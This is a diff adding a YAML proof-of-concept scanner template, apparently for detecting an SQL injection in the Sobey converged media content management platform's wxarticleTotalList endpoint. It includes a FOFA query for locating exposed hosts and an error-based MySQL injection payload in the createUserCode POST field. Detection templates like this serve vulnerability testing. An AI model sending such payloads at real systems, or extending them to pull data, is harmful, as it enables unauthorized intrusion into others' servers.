@@ -1,0 +1,21 @@
+id: poc-yaml-sobey-imcmp-wxarticletotallist-sqli
+info:
+  name: 索贝融合媒体内容管理平台 wxarticleTotalList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /sobey-mchEditor/mch/statistics/js/../wxarticleTotalList
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: createUserCode=1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3141=3141,md5({{.t1}})))),0x7e),3141)
+    AND 'JXVi'='JXVi&token=1&siteCode=1
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,"wxarticleTotalList")
+    && contains(body,`~` + t2 + `~`) && contains(body,"java.sql.SQLException")
+transport: http
